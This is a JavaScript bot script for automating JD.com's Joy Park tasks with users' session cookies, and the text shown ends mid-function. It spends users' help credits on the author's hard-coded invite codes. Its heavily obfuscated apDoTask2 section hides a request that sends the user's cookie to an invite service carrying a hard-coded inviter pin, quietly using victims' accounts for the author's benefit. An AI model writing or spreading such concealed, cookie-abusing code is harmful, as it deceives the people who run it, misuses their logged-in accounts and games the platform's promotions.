/*

脚本默认会帮我助力开工位，介意请添加变量HELP_JOYPARK，false为不助力
export HELP_JOYPARK=""

更新地址：https://github.com/Tsukasa007/my_script
============Quantumultx===============
[task_local]
#汪汪乐园每日任务
0 0,7,9,17,20 * * * jd_joypark_task.js, tag=汪汪乐园每日任务, img-url=https://raw.githubusercontent.com/tsukasa007/icon/master/jd_joypark_task.png, enabled=true

================Loon==============
[Script]
cron "0 0,7,9,17,20 * * *" script-path=jd_joypark_task.js,tag=汪汪乐园每日任务

===============Surge=================
汪汪乐园每日任务 = type=cron,cronexp="0 0,7,9,17,20 * * *",wake-system=1,timeout=3600,script-path=jd_joypark_task.js

============小火箭=========
汪汪乐园每日任务 = type=cron,script-path=jd_joypark_task.js, cronexpr="0 0,7,9,17,20 * * *", timeout=3600, enable=true
*/
const $ = new Env('汪汪乐园每日任务');
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
const notify = $.isNode() ? require('./sendNotify') : '';
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '';

if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => { };
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
$.invitePinTaskList = []
$.invitePin = [
  "NZ42T3lD49qiTGpZsSucXRS8kD-wJ4K6FxwxUpNbb4I",
  "zZkewfd3OKs-WtoJd8Jw6OIrD81WzO3SX56S2DGMlZ0",
  "7zG4VHS99AUEoX1mQTkC9Q",
  "BbsjCRrQudIL06kRvqmVln053h03GiApg7HN_Vhy_Og",
  "sAxL-dc5T6lS6wtKqP6SlA",
  "bcVxt4PbZdbX7tiT1Q_ubg",
  "GLdMkFrZHXG8-YUnhakmEA",
  "hwQ_gsL-AJeC0gGTlU0Z8w",
  "DsYL6f_31DFANxBPMc00MA"
]
const JD_API_HOST = `https://api.m.jd.com/client.action`;
message = ""
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/', {
      "open-url": "https://bean.m.jd.com/"
    });
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    cookie = cookiesArr[i];
    if (cookie) {
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      $.openIndex = 0
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      // if ($.isNode()) {
      //   if (process.env.HELP_JOYPARK && process.env.HELP_JOYPARK == "false") {
      //   } else {
      //     $.kgw_invitePin = ["7zG4VHS99AUEoX1mQTkC9Q"][Math.floor((Math.random() * 1))];
      //     let resp = await getJoyBaseInfo(undefined, 2, $.kgw_invitePin);
      //     if (resp.data && resp.data.helpState && resp.data.helpState === 1) {
      //       $.log("帮【zero205】开工位成功，感谢！\n");
      //     } else if (resp.data && resp.data.helpState && resp.data.helpState === 3) {
      //       $.log("你不是新用户！跳过开工位助力\n");
      //       break
      //     } else if (resp.data && resp.data.helpState && resp.data.helpState === 2) {
      //       $.log(`他的工位已全部开完啦！\n`);
      //       $.openIndex++
      //     } else {
      //       $.log("开工位失败！\n");
      //     }
      //   }
      // }
      await getJoyBaseInfo()
      if ($.joyBaseInfo && $.joyBaseInfo.invitePin) {
        $.log(`${$.name} - ${$.UserName}  助力码: ${$.joyBaseInfo.invitePin}`);
        $.invitePinTaskList.push($.joyBaseInfo.invitePin);
      } else {
        $.log(`${$.name} - ${$.UserName}  助力码: null`);
        $.invitePinTaskList.push('');
        $.isLogin = false
        $.log("服务端异常，不知道为啥有时候这样，后面再观察一下，手动执行应该又没问题了")
        continue
      }
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {
          "open-url": "https://bean.m.jd.com/bean/signIndex.action"
        });
        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await getTaskList();

      // 签到 / 逛会场 / 浏览商品
      for (const task of $.taskList) {
        if (task.taskType === 'SIGN') {
          $.log(`${task.taskTitle}`)
          await apDoTask(task.id, task.taskType, undefined);
          $.log(`${task.taskTitle} 领取奖励`)
          await apTaskDrawAward(task.id, task.taskType);
        }
        if (task.taskType === 'BROWSE_PRODUCT' || task.taskType === 'BROWSE_CHANNEL' && task.taskLimitTimes !== 1) {
          let productList = await apTaskDetail(task.id, task.taskType);
          let productListNow = 0;
          if (productList.length === 0) {
            let resp = await apTaskDrawAward(task.id, task.taskType);

            if (!resp.success) {
              $.log(`${task.taskTitle}|${task.taskShowTitle} 领取完成!`)
              productList = await apTaskDetail(task.id, task.taskType);

            }
          }
          //做
          while (task.taskLimitTimes - task.taskDoTimes >= 0) {

            if (productList.length === 0) {
              $.log(`${task.taskTitle} 活动火爆，素材库没有素材，我也不知道啥回事 = = `);
              break;
            }
            $.log(`${task.taskTitle} ${task.taskDoTimes}/${task.taskLimitTimes}`);
            let resp = await apDoTask(task.id, task.taskType, productList[productListNow].itemId, productList[productListNow].appid);

            if (resp.code === 2005 || resp.code === 0) {
              $.log(`${task.taskTitle}|${task.taskShowTitle} 任务完成！`)
            } else {
              $.log(`${resp.echo} 任务失败！`)
            }
            productListNow++;
            task.taskDoTimes++;
            if (!productList[productListNow]) {
              break
            }
          }
          //领
          for (let j = 0; j < task.taskLimitTimes; j++) {
            let resp = await apTaskDrawAward(task.id, task.taskType);

            if (!resp.success) {
              $.log(`${task.taskTitle}|${task.taskShowTitle} 领取完成!`)
              break
            }
          }
        } else if (task.taskType === 'SHARE_INVITE') {
          $.yq_taskid = task.id
          for (let j = 0; j < 5; j++) {
            let resp = await apTaskDrawAward($.yq_taskid, 'SHARE_INVITE');

            if (!resp.success) {
              break
            }
            $.log("领取助力奖励成功！")
          }
        }
        if (task.taskType === 'BROWSE_CHANNEL' && task.taskLimitTimes === 1) {
          $.log(`${task.taskTitle}|${task.taskShowTitle}`)
          await apDoTask2(task.id, task.taskType, task.taskSourceUrl);
          $.log(`${task.taskTitle}|${task.taskShowTitle} 领取奖励`)
          await apTaskDrawAward(task.id, task.taskType);
        }
        // if (task.taskType === 'SHARE_INVITE') {
        //   $.yq_taskid = task.id
        // }
      }
    }
  }

  $.log("\n======汪汪乐园开始内部互助======\n======有剩余助力次数则帮zero205助力======\n")
  for (let i = 0; i < cookiesArr.length; i++) {
    cookie = cookiesArr[i];
    if (cookie) {
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {
          "open-url": "https://bean.m.jd.com/bean/signIndex.action"
        });
        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      $.newinvitePinTaskList = [...($.invitePinTaskList || []), ...($.invitePin || [])]
      for (const invitePinTaskListKey of $.newinvitePinTaskList) {
        $.log(`【京东账号${$.index}】${$.nickName || $.UserName} 助力 ${invitePinTaskListKey}`)
        let resp = await getJoyBaseInfo($.yq_taskid, 1, invitePinTaskListKey);
        if (resp.success) {
          if (resp.data.helpState === 1) {
            $.log("助力成功！");
          } else if (resp.data.helpState === 0) {
            $.log("自己不能助力自己！");
          } else if (resp.data.helpState === 2) {
            $.log("助力过了！");
          } else if (resp.data.helpState === 3) {
            $.log("没有助力次数了！");
            break
          } else if (resp.data.helpState === 4) {
            $.log("这个B助力满了！");
          }
        } else {
          $.log("数据异常 助力失败！\n\n")
          break
        }
      }
    }
  }
})()
  .catch((e) => $.logErr(e))
  .finally(() => $.done())
//获取活动信息

//任务列表
function getTaskList() {
  //await $.wait(20)
  return new Promise(resolve => {
    $.post(taskPostClientActionUrl(`body=%7B%22linkId%22%3A%22LsQNxL7iWDlXUs6cFl-AAg%22%7D&appid=activities_platform`, `apTaskList`), async (err, resp, data) => {
      $.log('=== 任务列表 start ===')
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          data = JSON.parse(data);
          $.taskList = data.data
          for (const row of $.taskList) {
            $.log(`${row.taskTitle} ${row.taskDoTimes}/${row.taskLimitTimes}`)
          }
          $.log('=== 任务列表 end  ===')
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

/**
 * 互助
 * @param taskId
 * @param inviteType
 * @param inviterPin
 * @returns {Promise<unknown>}
 */
function getJoyBaseInfo(taskId = '', inviteType = '', inviterPin = '') {
  //await $.wait(20)
  return new Promise(resolve => {
    $.post(taskPostClientActionUrl(`body={"taskId":"${taskId}","inviteType":"${inviteType}","inviterPin":"${inviterPin}","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1625480372020&appid=activities_platform`, `joyBaseInfo`), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          data = JSON.parse(data);
          $.joyBaseInfo = data.data
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        $.log(`resolve start`)
        resolve(data);
        $.log(`resolve end`)
      }
    })
  })
}

function apDoTask(taskId, taskType, itemId = '', appid = 'activities_platform') {
  //await $.wait(20)
  return new Promise(resolve => {
    $.post(taskPostClientActionUrl(`body={"taskType":"${taskType}","taskId":${taskId},"channel":4,"linkId":"LsQNxL7iWDlXUs6cFl-AAg","itemId":"${itemId}"}&appid=${appid}`, `apDoTask`), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

var _0xodE='jsjiami.com.v6',_0xodE_=['‮_0xodE'],_0x1544=[_0xodE,'w4bDu8Otw78f','wrvDq8K3DMOxw70bwrPDoHEfwqnCrA==','aljCr8OHagIyV8OIwovDnQ==','wo7CmcOUw4LDoMO3R0Fmw4pJw7fDrTTCqHDCqy4SU8Kww4XCtD3Ch0fCpzAdw7oxMcKUXRc3NMOrPHjCr3Jww4VH','w4TCjRNxw47Dn8KLw5s=','Nw89fSrDtMOUwqxQLBpjFhvCqMKhwqFsw4vCt3HDhsOkwolxEcKjwp8eDsKRw5vDpMOiYcKCDCDCmcKkw7rDisKVeQ==','w785EcO0JAbCuCoUwrvDq1srwqtyIcOiwpo9w6LDm1HDg0gCw6bCncOFwodAW8OARA==','IcKlYMOww4DCjsO9woHDuMOsUyprw5cgwofCqcOQCTjDisOuEsKywoAhYmEGw6JRw4Jx','wr/DoV/DsMKbwpPDjWTDuAIEQwTDhFnCgw==','DcOYUcKtwpEaFMKNwqrDmcKQQcOPCsK1wpV1NMONMMKXe8OswowZWGzDn8K9w5bCh8Kqw5oXw6PCu3jCmFXCkn5MbwsKEQTDm1bCp1VBwpLCnsKQcW3CiCAHwpdaw7PDr8Okw4nCi3pbQMOMwrDDvTwLVyE0EUzDtl/CkFnDisKGXG/DugXDqnHDj8KWwr8Jwp3DlsOBSRbCl2nDtADCjMKaXn4Bw5FYfcKfYnPChCJnJxEUHQjDvAXDmzAKw6ETw4PDmMKtw4MRw5M0fMK+wpLDoxdoworCqcKHaTZ1w6VkZWI=','VsKFU8OkwpY=','fcKoc8Ogwo0=','w6HDhw3CiBs=','JMKMIA==','wpXCiA3CscKJwoLDj8KdQw==','GAdt','wrjDgjlE','wqbCv8OP','w4LDksOv','wojCnRLCvQ==','w6DCiMKTJOitteazlOWlvui3r+++nOivo+ajveadtue/n+i1mOmHv+iusQ==','wojCoyXCvMKR','w41Sw7LCuHY=','UMOAw7HChSs=','w4l7w7DCj04W','w7bDncOqw7LDiA==','w7AaBMOCDw==','aX3CvGNc','wofCjBbDtsKKw4vDjMKfFGQyGA==','wonCqBrCt8KP','RcOPw7U=','w7nDjQrCqAZIwqNPw6rDvRjDq8Kq','wqbDmXE=','w7plfGQwwqfDqzAHYw==','J8KVwqHCq8KPCw8=','eMOIRTU=','w5TDuyHCmTR5wpA=','WcOKw5/Cjw==','wqTCv8Of','woXCkEjCoA==','UsK3cMK6wozDtTACw67CmsOiw7s=','wovDkh1Nw4XDq8Krw7XCgsKvw7MWWMKFw7wy','QEHDt1wsw4PDqVZ4wpctBsKHwr07wrjDlwzCmsO2Xg==','aMKATsKlw4g=','w5fDpMO7HAJ6w70qw75Aw73Cu0DDkQXDvl3CisOxCn8tw77CpMKMw7Q0NyJvCsK2w5DCh8K8G11qw6XDmmXCgi4Z','w5XDsjrCkic=','wpTCnRHCvMKIwog=','woQqwrF7w6s=','csOpw7rCosO8w73DugxdwokawrUBwpfDssKGMcKpNElowqDCj0LDo8O+AkzDiMK1CVbDqg==','B8KoYwrCrWvDkcKPIMO/XsK2w5s=','wo/CqTjCm8KAw6fDmnXDlW8=','csOYwqsz','w5AmLcO1HQ==','NwnCrggw','aHcTw7jCmsODwrd+woo6JiDDn8OoDcOBLsK8w5TCvFl3wpc9woVzOcO0wo0uwr4Dw7HCisKgwofCpVLCrhHCvFN6XcOLE01qw5ZXYQXCq1rCpHIvwoXDmEnCgsOqETJMSGrCicO5w6vClsOuw4XDiw/DqyjCmsKZBkdoCl8awo3CqcOtSxAfTRzCp8K9wp8pw57Du0UCZD3Dr8KGX8KNJ8KPSsKCw5spMw==','wpnDnDpGDg==','CMKeF8K1wpwLAcOfwqvCgcK9XcKNUMO2w4stfsOAZsOHPcKpw51WG33DisK5w5LDmMKpw4BGw7/CqHjDhyXDm1tRPg==','wrjCisOCMMO2','w4Flw6Au','C8Kvw6bClF8WwrTDs8KawrXCmmxfRxdhw548wpkewpfCksOlw505w67DlCcjSMK/w4Rzw6XClsKJDi0twqlaVXsP','wqvCoMOYMsOQYVTCtjYYw6jCncO8w4/Drw7Cl8O5FD3CoE7DrMKzOcO5w648w4vDkibCjXQ=','RFEow5o=','woXDkcOcw4fDusO9flV/wpk7w5rDul7DlSbDljdLP8OFwp3DglzDjx/CoQIGwrgCG8OcCFJzNMKkFHrCnH8+wpMEHsOuwp3ClMObKVzCix0aLsK5w5TCiMOMdQrCoMONM8KKBMKww4jCnsKWKMOfMsKHwq0NwphlbW8LwrQ0w58gw4tNbmc+MgHDvMOkw47CugwMccO6w7gQwqnDhEwcwr4CMA0xwrtVFcOyB8KhcMOpEMKmw41zw47CtcKVwrgdwqZiKT0oU8K3K1/DkTvDgiRQwqfDhMO3w6DDggM/wrzCiVjDvw==','RRgpwqNm','b3IUwrXCg8KEwrJ0w609dBk=','wqvCoMOYMsOQYVTCtjYYw6jCncOuwpHDtxfDjMO0BjfCqlfDrsK2J8O0w6I8woTCnWjDhzo=','w6HDpcKcMgw=','wqsFHjbDlcKo','w4pYTw==','XCcDwr1eAcKDwrdhIMKmR8Ke','T8OcQw==','eHApw7TCgA==','wrzDpSrCuMOGw5zDj8Oqw6LDsMOGOcKFAVRy','ccKZw63CjmQxwp3CgMKywrE=','wpJEwq/Ct8OnKMKb','wqfDvcOpKsOc','wpDCqSjCiA==','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','DQ3DhsOcRw==','KQTDvcOfYhI4asOFw4bCiWggwq/CrsK3OlIVWnFXZ2LCpsKSNMO9w6vDtyXDiMOn','WcO7wpdcZcOHwprCsHLDtgt2','w7Y9FcOoPl/DtnEXwrvDvAQgwqp2YcKkw55nw6TDjEg=','wo7CiAvCqMKUw5/CicOUUGgkBcKncGYPTEzCp8OJL2czPsKmw59tw6zCmMKgw5csYSXDvUAvCsKSGcKiwrDCqsObCTRew7MKM8OGJmTCsDsdwrXCtcOHw5vDo8KSfQAJw4nCsRQYeD1zwp7DhnwTCHwcQ8Ovw4vDq8OQLsOOd8Ktw6hoYDXChTI6woVkwpQxwofDg8KAwpN4w5/CtirCsh1ewprCozJLwpMqMzvCqMObUcOUwqPCvVPDpcOUwrd2wr5uR8Ovwpd9SMKsNMOiw4DCh0DCuVcGwpLCmA==','TMK+w5zCrEhKw7XDqsKdwpXDmBZ0HithwpFswp8Dw5I=','L8K6SMO6w4c=','eMO+w7PCu8OA','wrDCgcKEN8OR','w5fDvcO+w5PDtw==','eTsSwq15','bHfCpXZo','jseQfjiaAmiUf.com.v6fE=='];if(function(_0x49ef2d,_0x389464,_0x22cc4b){function _0x27f8c0(_0x52d92b,_0x481971,_0x58cc04,_0x287f68,_0x54e3d8,_0x3c034f){_0x481971=_0x481971>>0x8,_0x54e3d8='po';var _0x4e20e6='shift',_0x40375a='push',_0x3c034f='‮';if(_0x481971<_0x52d92b){while(--_0x52d92b){_0x287f68=_0x49ef2d[_0x4e20e6]();if(_0x481971===_0x52d92b&&_0x3c034f==='‮'&&_0x3c034f['length']===0x1){_0x481971=_0x287f68,_0x58cc04=_0x49ef2d[_0x54e3d8+'p']();}else if(_0x481971&&_0x58cc04['replace'](/[eQfAUffE=]/g,'')===_0x481971){_0x49ef2d[_0x40375a](_0x287f68);}}_0x49ef2d[_0x40375a](_0x49ef2d[_0x4e20e6]());}return 0xdf815;};return _0x27f8c0(++_0x389464,_0x22cc4b)>>_0x389464^_0x22cc4b;}(_0x1544,0xb7,0xb700),_0x1544){_0xodE_=_0x1544['length']^0xb7;};function _0x5df1(_0x13abcc,_0x23a8fe){_0x13abcc=~~'0x'['concat'](_0x13abcc['slice'](0x1));var _0x5c7024=_0x1544[_0x13abcc];if(_0x5df1['ikOrSY']===undefined){(function(){var _0xca6ed4;try{var _0x4e1ee8=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0xca6ed4=_0x4e1ee8();}catch(_0x312d5b){_0xca6ed4=window;}var _0x401437='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xca6ed4['atob']||(_0xca6ed4['atob']=function(_0x11a1de){var _0x21207b=String(_0x11a1de)['replace'](/=+$/,'');for(var _0x1b580e=0x0,_0x3d963f,_0x2042d3,_0x506149=0x0,_0x344d3c='';_0x2042d3=_0x21207b['charAt'](_0x506149++);~_0x2042d3&&(_0x3d963f=_0x1b580e%0x4?_0x3d963f*0x40+_0x2042d3:_0x2042d3,_0x1b580e++%0x4)?_0x344d3c+=String['fromCharCode'](0xff&_0x3d963f>>(-0x2*_0x1b580e&0x6)):0x0){_0x2042d3=_0x401437['indexOf'](_0x2042d3);}return _0x344d3c;});}());function _0x40bf00(_0x328077,_0x23a8fe){var _0x39500e=[],_0x3ecaee=0x0,_0x22be2d,_0x1b7c0d='',_0x23e3b8='';_0x328077=atob(_0x328077);for(var _0x2b1506=0x0,_0x535a39=_0x328077['length'];_0x2b1506<_0x535a39;_0x2b1506++){_0x23e3b8+='%'+('00'+_0x328077['charCodeAt'](_0x2b1506)['toString'](0x10))['slice'](-0x2);}_0x328077=decodeURIComponent(_0x23e3b8);for(var _0x462715=0x0;_0x462715<0x100;_0x462715++){_0x39500e[_0x462715]=_0x462715;}for(_0x462715=0x0;_0x462715<0x100;_0x462715++){_0x3ecaee=(_0x3ecaee+_0x39500e[_0x462715]+_0x23a8fe['charCodeAt'](_0x462715%_0x23a8fe['length']))%0x100;_0x22be2d=_0x39500e[_0x462715];_0x39500e[_0x462715]=_0x39500e[_0x3ecaee];_0x39500e[_0x3ecaee]=_0x22be2d;}_0x462715=0x0;_0x3ecaee=0x0;for(var _0x26dd71=0x0;_0x26dd71<_0x328077['length'];_0x26dd71++){_0x462715=(_0x462715+0x1)%0x100;_0x3ecaee=(_0x3ecaee+_0x39500e[_0x462715])%0x100;_0x22be2d=_0x39500e[_0x462715];_0x39500e[_0x462715]=_0x39500e[_0x3ecaee];_0x39500e[_0x3ecaee]=_0x22be2d;_0x1b7c0d+=String['fromCharCode'](_0x328077['charCodeAt'](_0x26dd71)^_0x39500e[(_0x39500e[_0x462715]+_0x39500e[_0x3ecaee])%0x100]);}return _0x1b7c0d;}_0x5df1['cMCwRI']=_0x40bf00;_0x5df1['ynhzsv']={};_0x5df1['ikOrSY']=!![];}var _0x5313fb=_0x5df1['ynhzsv'][_0x13abcc];if(_0x5313fb===undefined){if(_0x5df1['DjxHme']===undefined){_0x5df1['DjxHme']=!![];}_0x5c7024=_0x5df1['cMCwRI'](_0x5c7024,_0x23a8fe);_0x5df1['ynhzsv'][_0x13abcc]=_0x5c7024;}else{_0x5c7024=_0x5313fb;}return _0x5c7024;};function apDoTask2(_0x5d013a,_0x3a425b,_0x28b170){var _0x47de3f={'uFFxy':function(_0x2a26ce,_0x1c2203){return _0x2a26ce(_0x1c2203);},'oONEt':_0x5df1('‫0','wsjB'),'cfvzF':_0x5df1('‮1','!pdr'),'REVeh':_0x5df1('‫2','j]%N'),'ReiWD':_0x5df1('‫3','h#zU')};return new Promise(_0x360f0e=>{var _0x397bf5={'TfRYF':function(_0x1c9a08,_0x4f7cd9){return _0x47de3f[_0x5df1('‮4','&3QL')](_0x1c9a08,_0x4f7cd9);},'KReuG':_0x47de3f[_0x5df1('‫5','(ymn')],'Nojtl':_0x47de3f[_0x5df1('‮6','R&!P')],'RYXuN':function(_0x195ac7,_0x47d5b5){return _0x195ac7===_0x47d5b5;},'UUNEd':_0x47de3f['REVeh'],'Rkezh':_0x47de3f['ReiWD'],'QvhAG':_0x5df1('‮7','bpn5')};const _0x5d8418=_0x5df1('‫8','h#zU')+_0x3a425b+_0x5df1('‮9','&3Bx')+_0x5d013a+_0x5df1('‫a','&3QL')+_0x28b170+'\x22}';$['post'](taskPost(_0x5df1('‮b',')YfD'),_0x5d8418),async(_0x4b03cc,_0x81e603,_0x487be3)=>{var _0x1e0623={'nSeZB':_0x5df1('‮c','A)9D'),'hdkDZ':function(_0x51c522,_0x16334d){return _0x51c522*_0x16334d;},'JGuss':_0x5df1('‫d',']zS('),'oTeoh':_0x5df1('‮e','!pdr'),'TOYwD':function(_0x1acf8a,_0x5b943c){return _0x397bf5['TfRYF'](_0x1acf8a,_0x5b943c);},'UtoNu':_0x5df1('‮f','kbWG'),'wcXUd':_0x5df1('‮10','GtTf'),'sArNc':_0x397bf5['KReuG']};if(_0x5df1('‫11','P#@u')!==_0x397bf5[_0x5df1('‫12','P#@u')]){try{if(_0x397bf5[_0x5df1('‮13','d%$7')](_0x397bf5['UUNEd'],_0x397bf5['Rkezh'])){console[_0x5df1('‫14','j3@H')](''+JSON[_0x5df1('‮15','Aq5V')](_0x4b03cc));console[_0x5df1('‮16','A)9D')]($[_0x5df1('‮17','n&pw')]+'\x20API请求失败，请检查网路重试');}else{if(_0x4b03cc){console[_0x5df1('‫18','&m0B')](''+JSON['stringify'](_0x4b03cc));console[_0x5df1('‫19','bpn5')]($[_0x5df1('‮1a','Aq5V')]+_0x5df1('‮1b','h#zU'));}else{if(_0x397bf5[_0x5df1('‫1c','aFUj')](_0x5df1('‫1d','5[g0'),_0x397bf5['QvhAG'])){_0x487be3=JSON[_0x5df1('‮1e','1V&u')](_0x487be3);await apDoTask3();await apDoTask4();}else{_0x360f0e(_0x487be3);}}}}catch(_0x929e6d){$[_0x5df1('‫1f','5[g0')](_0x929e6d,_0x81e603);}finally{_0x397bf5[_0x5df1('‫20','&3QL')](_0x360f0e,_0x487be3);}}else{let _0x18ec51=['/eNHdfn6fP+TFwVda3ipjWwvTFqeKBZaRG38adWABKk=',_0x1e0623[_0x5df1('‫21',']zS(')]][Math[_0x5df1('‮22','R&!P')](_0x1e0623['hdkDZ'](Math['random'](),0x2))];let _0x44fbfd={'Host':_0x5df1('‮23','Aq5V'),'accept':_0x1e0623['JGuss'],'content-type':_0x1e0623[_0x5df1('‮24','Aq5V')],'user-agent':$['isNode']()?process[_0x5df1('‫25','1V&u')][_0x5df1('‫26','d%$7')]?process[_0x5df1('‫27','uyYu')]['JS_USER_AGENT']:_0x1e0623['TOYwD'](require,_0x1e0623['UtoNu'])[_0x5df1('‮28','zNtz')]:$[_0x5df1('‫29','2RrD')](_0x5df1('‫2a','CwXL'))?$[_0x5df1('‮2b','d%$7')](_0x5df1('‫2c','j]%N')):_0x1e0623['wcXUd'],'Cookie':cookie};let _0x2b3a90='functionId=TaskInviteService&body={\x22method\x22:\x22participateInviteTask\x22,\x22data\x22:{\x22channel\x22:\x221\x22,\x22encryptionInviterPin\x22:\x22'+encodeURIComponent(_0x18ec51)+'\x22,\x22type\x22:1}}&appid=market-task-h5&uuid=&_t='+Date[_0x5df1('‫2d','&m0B')]();var _0x8f5dd5={'url':_0x1e0623['sArNc'],'headers':_0x44fbfd,'body':_0x2b3a90};$[_0x5df1('‫2e','XNZ[')](_0x8f5dd5,(_0x56a04a,_0x38420c,_0x4e457e)=>{});}});});}function apDoTask3(){var _0x269b90={'jISRo':'/eNHdfn6fP+TFwVda3ipjWwvTFqeKBZaRG38adWABKk=','vYoqq':function(_0x163071,_0x4bc92c){return 